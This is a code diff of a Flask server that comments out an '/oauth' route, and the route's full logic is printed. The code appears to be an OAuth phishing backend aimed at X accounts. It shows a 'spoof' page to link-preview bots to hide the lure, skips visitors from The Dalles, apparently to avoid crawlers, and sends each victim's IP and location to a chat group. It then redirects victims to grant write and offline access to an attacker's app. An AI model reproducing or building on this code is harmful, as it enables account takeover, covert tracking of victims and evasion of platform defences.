@@ -27,63 +27,62 @@ logger = config["LOGGER"]["SERVER"]
 def index():
     return redirect("https://x.com/")
 
-@app.route('/oauth')
-def oauth():
-    return
-    user_agent = request.headers.get('User-Agent', '').strip()
-    identifier = request.args.get('i')
+# @app.route('/oauth')
+# def oauth():
+#     user_agent = request.headers.get('User-Agent', '').strip()
+#     identifier = request.args.get('i')
 
-    if not identifier:
-        return "⚠️ Identifier is required.", 400
+#     if not identifier:
+#         return "⚠️ Identifier is required.", 400
 
-    group = groups.find_one(
-        {"identifiers.identifier": identifier}
-    )
-    if not group:
-        return "⚠️ Identifier is invalid.", 404
+#     group = groups.find_one(
+#         {"identifiers.identifier": identifier}
+#     )
+#     if not group:
+#         return "⚠️ Identifier is invalid.", 404
 
-    matched = next(i for i in group["identifiers"] if i["identifier"] == identifier)
+#     matched = next(i for i in group["identifiers"] if i["identifier"] == identifier)
     
-    spoof = group["spoof"]
-    session["redirect_url"] = group["redirect"]
+#     spoof = group["spoof"]
+#     session["redirect_url"] = group["redirect"]
 
-    client = group["client"]
-    session["client_id"] = client["id"]
-    session["client_secret"] = client["secret"]
+#     client = group["client"]
+#     session["client_id"] = client["id"]
+#     session["client_secret"] = client["secret"]
     
-    session["owner_id"] = group["owner_id"]
-    session["group_id"] = group["group"]["id"]
-    session["worker_id"] = matched["user_id"]
+#     session["owner_id"] = group["owner_id"]
+#     session["group_id"] = group["group"]["id"]
+#     session["worker_id"] = matched["user_id"]
     
-    if 'Twitterbot/1.0' in user_agent or 'TelegramBot' in user_agent or 'Discordbot' in user_agent:
-        return redirect(spoof)
+#     if 'Twitterbot/1.0' in user_agent or 'TelegramBot' in user_agent or 'Discordbot' in user_agent:
+#         return redirect(spoof)
 
-    real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-    res = requests.get(f'http://ip-api.com/json/{real_ip}')
-    location_data = res.json()
+#     real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+#     res = requests.get(f'http://ip-api.com/json/{real_ip}')
+#     location_data = res.json()
     
-    country, city = location_data.get("country"), location_data.get("city")
-    if city != "The Dalles":
-        country_flag = ''.join(chr(ord(c) + 127397) for c in location_data.get("countryCode", ""))
+#     country, city = location_data.get("country"), location_data.get("city")
+#     if city != "The Dalles":
+#         country_flag = ''.join(chr(ord(c) + 127397) for c in location_data.get("countryCode", ""))
 
-        message = f'🌐 *Connection:* {parse(real_ip)}\n\n{country_flag} *{parse(city)}, {parse(country)}*'
-        send_message(session["group_id"], message)
+#         message = f'🌐 *Connection:* {parse(real_ip)}\n\n{country_flag} *{parse(city)}, {parse(country)}*'
+#         send_message(session["group_id"], message)
 
-        client_id = session["client_id"]
-        domain = config["DOMAIN"]
-        callback_url = urllib.parse.quote(f"{domain}/auth", safe="")
+#         client_id = session["client_id"]
+#         domain = config["DOMAIN"]
+#         callback_url = urllib.parse.quote(f"{domain}/auth", safe="")
 
-        twitter_oauth_url = (f'https://x.com/i/oauth2/authorize?response_type=code&client_id={client_id}'
-                            f'&redirect_uri={callback_url}'
-                            f'&scope=tweet.read+users.read+tweet.write+offline.access+tweet.moderate.write'
-                            f'&state=state&code_challenge=challenge&code_challenge_method=plain')
+#         twitter_oauth_url = (f'https://x.com/i/oauth2/authorize?response_type=code&client_id={client_id}'
+#                             f'&redirect_uri={callback_url}'
+#                             f'&scope=tweet.read+users.read+tweet.write+offline.access+tweet.moderate.write'
+#                             f'&state=state&code_challenge=challenge&code_challenge_method=plain')
         
-        session.modified = True
-        resp = redirect(twitter_oauth_url)
-        current_app.session_interface.save_session(current_app, session, resp)
-        return resp
-    else:
-        return redirect(spoof)
+#         session.modified = True
+#         resp = redirect(twitter_oauth_url)
+#         current_app.session_interface.save_session(current_app, session, resp)
+#         return resp
+#     else:
+#         return redirect(spoof)
 
 @app.route('/auth')
 def auth_callback():
